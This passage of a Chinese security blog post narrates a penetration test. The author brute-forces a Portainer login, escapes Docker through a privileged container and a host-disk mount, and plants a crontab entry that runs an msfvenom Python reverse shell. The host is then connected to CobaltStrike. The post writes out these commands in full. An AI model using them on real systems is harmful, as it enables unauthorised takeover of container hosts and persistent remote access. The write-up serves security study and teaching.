src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/18_kEH7ia55rKX7kMdg9eWFyRR5NiaTBQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTzOm2MkpCTicLHahiapMLOynQl5P7QkEH7ia55rKX7kMdg9eWFyRR5NiaTBQ/640?wx_fmt=png'" style="width: 415px;height: 264px;"  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;">&nbsp;</p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;">开始爆破！！！</span></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;">成功爆破后，这里就登录</span>Portainer<span style="font family: 宋体;">进行</span>Docker<span style="font family: 宋体;">逃逸了：</span></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;">&nbsp;</p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><em><span style="font family: 宋体;">注：</span>Portainer</em><em><span style="font family: 宋体;">是一个可视化的容器镜像的图形管理工具，利用</span>Portainer</em><em><span style="font family: 宋体;">可以轻松构建，管理和维护</span>Docker</em><em><span style="font family: 宋体;">环境。</span> </em><em><span style="font family: 宋体;">而且完全免费，基于容器化的安装方式，方便高效部署。</span>Portainer</em><em><span style="font family: 宋体;">通过</span>Docker.sock</em><em><span style="font family: 宋体;">与宿主机进行通信，这是它的正常功能：</span></em> </p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="0" data-cropselx2="415" data-cropsely1="0" data-cropsely2="94" data-ratio="0.22650602409638554" data-s="300,640" data-type="png" data-w="830" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/19_N8nHZjTEcPEjib4Yu6gvONJYLVBeFA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTzcdX7PwIUbeuxGCXQ4Tq1wp21cN8nHZjTEcPEjib4Yu6gvONJYLVBeFA/640?wx_fmt=png'" style="width: 415px;height: 94px;"  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;">在</span>freebuf<span style="font family: 宋体;">看到是这么介绍的：</span></p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="0" data-cropselx2="415" data-cropsely1="0" data-cropsely2="276" data-ratio="0.6650602409638554" data-s="300,640" data-type="png" data-w="830" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/20_7XLeYnQ3KmRNoY2pwBPfqLjib0vAVw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTzI62MYBvTyOia0yVAI1EloU8fxh7XLeYnQ3KmRNoY2pwBPfqLjib0vAVw/640?wx_fmt=png'" style="width: 415px;height: 276px;"  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;">接下来开始逃逸，但是这里，我们进行链接的时候发现：</span></p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="0" data-cropselx2="415" data-cropsely1="0" data-cropsely2="101" data-ratio="0.2457831325301205" data-s="300,640" data-type="png" data-w="830" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/21_3ERclA85vnlM7X3wcz8HNfA1ic5C4Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTzNt5PvExL4AjLia9oiclUDruiazbp3ERclA85vnlM7X3wcz8HNfA1ic5C4Q/640?wx_fmt=png'" style="width: 415px;height: 102px;"  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;">啊这，那就只能使用这个方法了：</span></p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="1" data-cropselx2="416" data-cropsely1="0" data-cropsely2="210" data-ratio="0.5048076923076923" data-s="300,640" data-type="png" data-w="832" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/22_WBLZzQleWI2wpHsLFoISMFsnMa7Ecg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTzYjmEHNwc4lHxsTFUnnV03XTCWBLZzQleWI2wpHsLFoISMFsnMa7Ecg/640?wx_fmt=png'" style="width: 416px;height: 210px;"  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;">好了，真的开始了逃逸了，先创建个容器：</span></p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="1" data-cropselx2="416" data-cropsely1="0" data-cropsely2="194" data-ratio="0.46634615384615385" data-s="300,640" data-type="png" data-w="832" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/23_wWVporibiaXNttLyNrIDuB030DTdgQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTzsSJxO0QjxJTNJuHetFmXffr9E5wWVporibiaXNttLyNrIDuB030DTdgQ/640?wx_fmt=png'" style="width: 416px;height: 194px;"  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;">这里给他选择个特权模式：</span><br  /></p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="0" data-cropselx2="415" data-cropsely1="0" data-cropsely2="141" data-ratio="0.3397590361445783" data-s="300,640" data-type="png" data-w="830" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/24_ib634GasqPNgNEe1gzn39KibNkm33Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTzz5DuoQ91vaRt8ogbOrjTbdOZiapib634GasqPNgNEe1gzn39KibNkm33Q/640?wx_fmt=png'" style="width: 415px;height: 141px;"  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;">1.<span style="font family: 宋体;">然后链接这个容器的</span>shell<span style="font family: 宋体;">：</span>fdisk -l</p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="0" data-cropselx2="415" data-cropsely1="0" data-cropsely2="209" data-ratio="0.5036144578313253" data-s="300,640" data-type="png" data-w="830" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/25_lv7tuerUFuADbzFSF7pSMfG33SOMxw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTznd8iaMxH6qb6o7eqjSwIGEU5Mlv7tuerUFuADbzFSF7pSMfG33SOMxw/640?wx_fmt=png'" style="width: 415px;height: 209px;"  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;">2.<span style="font family: 宋体;">此时查看</span>/dev/<span style="font family: 宋体;">路径会发现很多设备文件：</span>ls /dev</p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="0" data-cropselx2="415" data-cropsely1="0" data-cropsely2="102" data-ratio="0.2457831325301205" data-s="300,640" data-type="png" data-w="830" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/26_CZ0Mvtb3hibBf8L0hm0o25z9zu1FXQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTzZgoN3FnAhA25YGxK5bZwO9eErCZ0Mvtb3hibBf8L0hm0o25z9zu1FXQ/640?wx_fmt=png'" style="width: 415px;height: 102px;"  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;">3.<span style="font family: 宋体;">新建目录以备挂载：</span>mkdir /abcd</p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;">4.<span style="font family: 宋体;">将</span>/dev/sda1<span style="font family: 宋体;">挂载至</span> /abcd: mount /dev/sda1 /abcd</p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;">5.<span style="font family: 宋体;">最终我们可以通过访问容器内部的</span>/abcd<span style="font family: 宋体;">路径来达到访问整个宿主机的目的：</span>ls /abcd:</p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="1" data-cropselx2="416" data-cropsely1="0" data-cropsely2="51" data-ratio="0.12259615384615384" data-s="300,640" data-type="png" data-w="832" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/27_ws8qEZCia2k0Cm7icWiaJOPMNsSWaw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTziaff7A0t0ibrX7K377yicHsTzvH2XZws8qEZCia2k0Cm7icWiaJOPMNsSWaw/640?wx_fmt=png'" style="width: 416px;height: 51px;"  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;">6.<span style="font family: 宋体;">接下来可以直接操作宿主的文件了！！！</span></p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="1" data-cropselx2="416" data-cropsely1="0" data-cropsely2="129" data-ratio="0.31009615384615385" data-s="300,640" data-type="png" data-w="832" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/28_puuUKB8FD34IUAh8wH2ibia2oWSruQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTzStH5oSPMsuC2ias9ScMIc75YDufpuuUKB8FD34IUAh8wH2ibia2oWSruQ/640?wx_fmt=png'" style="width: 416px;height: 129px;"  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;">7.<span style="font family: 宋体;">直接写计划任务拿</span>shell</p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;">先使用</span>msfvenom<span style="font family: 宋体;">生成一个</span>python<span style="font family: 宋体;">反弹</span>shell<span style="font family: 宋体;">的命令：</span></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="display: none;line-height: 0px;">‍</span><span style="display: none;line-height: 0px;">‍</span><span style="display: none;line-height: 0px;">‍</span><span style="display: none;line-height: 0px;">‍</span><span style="display: none;line-height: 0px;">‍</span><span style="display: none;line-height: 0px;">‍</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="nginx"><code><span class="code-snippet_outer"><span class="code-snippet__attribute">msfvenom</span> -p python/shell_reverse_tcp LHOST=ip LPORT=<span class="code-snippet__number">520</span> -f raw(这里生成的是基于py2的)</span></code></pre></section><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;">然后在</span>docker<span style="font family: 宋体;">里执行：</span><br  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;"></span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="ruby"><code><span class="code-snippet_outer">echo  <span class="code-snippet__string">"* *     * * *   root   python –c \" [msfvenom生成的代码]\""</span> <span class="code-snippet__meta">&gt;&gt; </span>/abcd/etc/crontab</span></code></pre></section><p style="text-align: center;"><img class="rich_pages" data-cropselx1="0" data-cropselx2="415" data-cropsely1="0" data-cropsely2="213" data-ratio="0.5144230769230769" data-s="300,640" data-type="png" data-w="832" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/29_fsG1tr4LIic5P0WhUq2dMSAU8ewKNA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTzbSaHdO7MhmDzf2fpLKTmCfcR0fsG1tr4LIic5P0WhUq2dMSAU8ewKNA/640?wx_fmt=png'" style="width: 415px;height: 213px;"  /><span style="color: rgb(0, 0, 0);font family: Calibri, sans-serif;font-size:14px;line-height:34px;;text-align: justify;">&nbsp;</span></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;">可以看到反弹了</span>shell<span style="font family: 宋体;">回来，那么是不是这个宿主机</span>Ubuntu<span style="font family: 宋体;">呢？那肯定是，随便执行点命令看看：</span></p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="1" data-cropselx2="416" data-cropsely1="0" data-cropsely2="80" data-ratio="0.19230769230769232" data-s="300,640" data-type="png" data-w="832" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/30_xJsRRucEOadyCa3d2wnibE71vlFxzw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTzQFYQfK1aSecicpU2FDhSKicAKMIxJsRRucEOadyCa3d2wnibE71vlFxzw/640?wx_fmt=png'" style="width: 416px;height: 80px;"  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;">好了，已经逃逸到</span>Ubuntu<span style="font family: 宋体;">了，接下来让它上线到</span>CobaltStrike<span style="font family: 宋体;">，使用</span>CrossC2<span style="font family: 宋体;">插件（</span>https://github.com/gloxec/CrossC2<span style="font family: 宋体;">）：</span></p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="0" data-cropselx2="415" data-cropsely1="0" data-cropsely2="91" data-ratio="0.22115384615384615" data-s="300,640" data-type="png" data-w="832" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/31_5atRZOITiaYHhuSgIZpxHibtibLupg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTz3mh40u8gyRhibdSBUdRbSyf9wdicu5atRZOITiaYHhuSgIZpxHibtibLupg/640?wx_fmt=png'" style="width: 415px;height: 92px;"  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;">上线了：</span></p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="1" data-cropselx2="416" data-cropsely1="0" data-cropsely2="157" data-ratio="0.37740384615384615" data-s="300,640" data-type="png" data-w="832" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/32_Ss2JuJqZljfccUJ2c2sbT8cPFTyP2A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTz899t0NicqRMrEWwo6wWfcTWtZSs2JuJqZljfccUJ2c2sbT8cPFTyP2A/640?wx_fmt=png'" style="width: 416px;height: 157px;"  /></p><p style="text-align: center;"><br mpa-from-tpl="t"  /></p><section data-mpa-template="t" mpa-from-tpl="t"><section style="display: flex;justify-content: center;align-items: center;width: 100%;padding: 10px;" data-mid="" mpa-from-tpl="t"><section style="display: flex;justify-content: flex-start;align-items: center;flex-direction: column;" data-mid="" mpa-from-tpl="t"><section style="width: 20px;height: 33px;align-self: flex-start;margin-bottom: -36.1px;margin-left: 2px;z-index: 1;" data-mid="" mpa-from-tpl="t"><img data-ratio="1.6097560975609757" data-type="png" data-w="82" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/33_NQQV5R5ZvJ97cBS9OY8vEhlEwhyqPg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/0fwWib0uAxkLXkkeCw3wrNGUOUicDRle5OQftoX4ib03wNZAXNtAMaLicJ7rNQQV5R5ZvJ97cBS9OY8vEhlEwhyqPg/640?wx_fmt=png'"  /></section><section style="border-width: 2px;border-style: solid;border-color: rgb(252, 248, 167);border-radius: 8px;" data-mid="" mpa-from-tpl="t"><section data-mid="" mpa-from-tpl="t" style="text-align: center;background-image: url(&quot;https://mmbiz.qpic.cn/mmbiz_png/lyPKRvR4V8Q4bbQOHnUZZuqDAXz9jBK4LvAMSadPkOnUt4vWHOz5NhDdic1rMoLrSjGXCWI0oArIkTAksfc28hw/640?wx_fmt=png&quot;);background-size: 100% 100%;padding: 10px 20px;border-radius: 8px;"><p style="font-size:16px;line-height:36px;;font family: PingFangSC-Medium, PingFang SC;font-weight: bold;color: #FCF8A7;line-height: 16px;" data-mid="" mpa-is-content="t">总结</p></section></section><section style="width: 44px;height: 31px;align-self: flex-end;margin-top: -36.1px;" data-mid="" mpa-from-tpl="t"><img data-ratio="0.7126436781609196" data-type="png" data-w="174" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/34_dyiacWPDFWibibafwz4RyCclFje8YA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3n7VQRz6w55cupvOM5odibMKicQP1zYeBKTWiadBWTEN0Tx4WWF8Mbp4x7e9BydyiacWPDFWibibafwz4RyCclFje8YA/640?wx_fmt=png'"  /></section></section></section></section><p><br mpa-from-tpl="t"  /></p><p><span style="color: rgb(0, 0, 0);text-align: start;font-size:14px;line-height:34px;;font family: Calibri, sans-serif;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: rgb(0, 0, 0);text-align: start;font-size:14px;line-height:34px;;font family: 宋体;">本文记录一次通过公网拿到</span><span style="color: rgb(0, 0, 0);text-align: start;font-size:14px;line-height:34px;;font family: Calibri, sans-serif;">docker</span><span style="color: rgb(0, 0, 0);text-align: start;font-size:14px;line-height:34px;;font family: 宋体;">容器权限，通过扫描发现宿主机地址，并对宿主机进行攻击，最后利用</span><strong style="color: rgb(0, 0, 0);font-size: medium;text-align: start;white-space: normal;"><em><span style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;">Portainer<span style="color: rgb(0, 0, 0);text-align: start;font-size: 10.5pt;font family: 宋体;">进行</span><span lang="EN-US" style="color: rgb(0, 0, 0);text-align: start;font-size: 10.5pt;font family: Calibri, sans-serif;">docker</span><span style="color: rgb(0, 0, 0);text-align: start;font-size: 10.5pt;font family: 宋体;">逃逸获得宿主机</span><span lang="EN-US" style="color: rgb(0, 0, 0);text-align: start;font-size: 10.5pt;font family: Calibri, sans-serif;">Ubuntu</span><span style="color: rgb(0, 0, 0);text-align: start;font-size: 10.5pt;font family: 宋体;">权限。</span><span style="color: rgb(0, 0, 0);font-size: medium;text-align: start;"></span></span></em></strong><br  /></p><section style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);"><img data-type="png" data-ratio="0.109375" data-w="640" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/35_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" style="color: rgb(163, 163, 163);letter-spacing: 0.544px;box-sizing: border-box !important;visibility: visible !important;width: 640px !important;"  /></section><section style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><strong>推荐阅读：</strong><br  /></section><section style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><strong><br  /></strong></section><section style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=Mzg3NzE5OTA5NQ==&amp;mid=2247484073&amp;idx=1&amp;sn=24f4e481dea7bfe873db4c3db4d20b5a&amp;chksm=cf27e931f85060278f1efe7d155900709b5061f2d5cfc228f1ab945ea412f383a6bdbd17993b&amp;scene=21#wechat_redirect" data-itemshowtype="0" tab="innerlink" data-linktype="2"><strong>Docker渗透思路调研</strong></a></section><section style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);"><br  /></section><p style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247490909&amp;idx=1&amp;sn=efdbd98bd302159324cb431f3d735165&amp;chksm=ec1f4862db68c174c21d98f46847bba21a19602c4823ec17fb7363662751c385817e85d9c6ce&amp;scene=21#wechat_redirect" textvalue="你已选中了添加链接的内容" data-itemshowtype="0" tab="innerlink" data-linktype="1" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);cursor: pointer;"><span class="js_jump_icon h5_image_link" data-positionback="static" style="line-height: 0;top: auto;left: auto;right: auto;bottom: auto;"><img class="rich_pages" data-ratio="0.4255555555555556" data-s="300,640" data-type="png" data-w="900" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/36_oDxIic2QaZYKKrLDlJFT5v6EpREmjg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou80h6Jor7Py4sKIwfiaowozsMP0Yjn9RcoJAmPMKa5hQVczeXoDxIic2QaZYKKrLDlJFT5v6EpREmjg/640?wx_fmt=png'" style="border-width: 0px;border-style: initial;border-color: initial;border-radius: 53px;box-sizing: border-box !important;width: 677px !important;visibility: visible !important;"  /></span></a></p><section style="margin-bottom: 20px;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);"><br  /></section><p style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><strong data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-darkmode-color-15976329806349="rgb(255, 104, 39)" data-darkmode-original-color-15976329806349="rgb(255, 104, 39)" style="color: rgb(255, 104, 39);font-size:18px;line-height:38px;;letter-spacing: 0.544px;">点赞，转发，在看</strong></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__1" style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: right;color: rgb(163, 163, 163) !important;"><span style="font-size:13px;line-height:33px;;">来源：雷石安全实验室</span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__3" style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><img class="rich_pages __bg_gif" data-ratio="0.5197505197505198" data-type="gif" data-w="962" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/37_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" style="box-sizing: border-box !important;visibility: visible !important;width: 677px !important;"  /></p>
                </div>
</div>
</body>
</html>